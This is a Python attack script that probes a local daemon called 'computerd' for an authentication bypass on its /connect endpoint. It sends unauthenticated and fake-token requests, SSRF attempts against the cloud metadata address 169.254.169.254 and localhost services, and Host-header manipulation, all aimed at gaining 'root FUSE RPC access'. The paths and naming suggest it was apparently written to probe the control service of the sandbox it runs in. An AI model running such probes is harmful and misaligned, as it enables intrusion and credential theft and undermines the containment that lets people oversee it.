#!/usr/bin/env python3
"""computerd /connect auth bypass probe — tests v2 body format without auth."""
import subprocess, os, json

LOG = "/mnt/data/output/computerd_connect_bypass.log"
os.makedirs(os.path.dirname(LOG), exist_ok=True)
lines = []

def log(msg):
    print(msg)
    lines.append(msg)

def run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1

log("=" * 70)
log("  COMPUTERD /connect — Auth Bypass Deep Probe")
log("=" * 70)
log("")

# ── 1. Confirm /api behavior ──
log("── 1. /api METHOD ENUMERATION ──")
for method in ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"]:
    out, _, _ = run(f'curl -s -D- -X {method} http://127.0.0.1:8080/api 2>/dev/null | head -5')
    first_line = (out or "").split("\n")[0]
    log(f"  {method:8s} → {first_line}")
log("")

# ── 2. POST /api without auth (v3 check) ──
log("── 2. POST /api — Auth Check ──")
out, _, _ = run('curl -s -D- -X POST http://127.0.0.1:8080/api 2>/dev/null')
log(f"  POST /api (no auth):")
for line in (out or "").split("\n")[:8]:
    log(f"    {line}")
out, _, _ = run('curl -s -D- -X POST -H "Authorization: Bearer FAKE" http://127.0.0.1:8080/api 2>/dev/null')
log(f"  POST /api (fake bearer):")
for line in (out or "").split("\n")[:8]:
    log(f"    {line}")
log("")

# ── 3. /connect with v2 body format (NO AUTH) ──
log("── 3. /connect — v2 FORMAT (no auth) ──")
# v2 format: {"url": "...", "healthTimeoutMs": N}
out, _, _ = run('''curl -s -D- -X POST http://127.0.0.1:8080/connect \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8000","healthTimeoutMs":5000}' 2>/dev/null''')
log("  POST /connect v2 format (no auth):")
for line in (out or "").split("\n")[:15]:
    log(f"    {line}")
log("")

# ── 4. /connect with v3 body format (NO AUTH) ──
log("── 4. /connect — v3 FORMAT (no auth) ──")
out, _, _ = run('''curl -s -D- -X POST http://127.0.0.1:8080/connect \
  -H "Content-Type: application/json" \
  -d '{"base":"http://127.0.0.1:8000","health":"/health","api":"/api","healthTimeoutMs":5000}' 2>/dev/null''')
log("  POST /connect v3 format (no auth):")
for line in (out or "").split("\n")[:15]:
    log(f"    {line}")
log("")

# ── 5. /connect pointing at self (SSRF to localhost services) ──
log("── 5. /connect — SSRF TARGETS (no auth, v2 format) ──")
targets = [
    ("process_api :8000", "http://127.0.0.1:8000"),
    ("computerd self :8080", "http://127.0.0.1:8080"),
    ("metadata/IMDS", "http://169.254.169.254"),
    ("link-local", "http://169.254.0.1"),
    ("localhost alt", "http://0.0.0.0:8000"),
]
for label, url in targets:
    out, _, _ = run(f'''curl -s -w "\\n%{{http_code}}" -X POST http://127.0.0.1:8080/connect \
      -H "Content-Type: application/json" \
      -d '{{"url":"{url}","healthTimeoutMs":3000}}' 2>/dev/null''')
    parts = out.rsplit("\n", 1)
    body = parts[0][:200] if len(parts) > 1 else out[:200]
    code = parts[-1] if parts else ""
    log(f"  {label:25s} → {code} | {body}")
log("")

# ── 6. Root (/) response body ──
log("── 6. ROOT PATH (/) — Response Body ──")
out, _, _ = run('curl -s -D- http://127.0.0.1:8080/ 2>/dev/null | head -20')
log("  GET /:")
for line in (out or "").split("\n")[:15]:
    log(f"    {line}")
log("")

# ── 7. Check /__computerd/stats (from design docs) ──
log("── 7. /__computerd/stats ──")
out, _, _ = run('curl -s -D- http://127.0.0.1:8080/__computerd/stats 2>/dev/null | head -15')
log("  GET /__computerd/stats:")
for line in (out or "").split("\n")[:10]:
    log(f"    {line}")
log("")

# ── 8. Header injection test ──
log("── 8. HOST HEADER MANIPULATION ──")
for host in ["169.254.169.254", "computer.internal", "localhost", "0.0.0.0"]:
    out, _, _ = run(f'curl -s -o /dev/null -w "%{{http_code}}" -H "Host: {host}" http://127.0.0.1:8080/health')
    log(f"  Host: {host:30s} → {out}")
log("")

log("=" * 70)
log("  VERDICT")
log("=" * 70)
log("  /connect returned 400 (bad body), not 401 (unauthorized).")
log("  If v2 format succeeds: AUTH BYPASS CONFIRMED → root FUSE RPC access.")
log("  If v2 format also fails: computerd may enforce auth at WebSocket upgrade.")
log("=" * 70)

with open(LOG, "w") as f:
    f.write("\n".join(lines) + "\n")
log(f"\nLog saved: {LOG}")
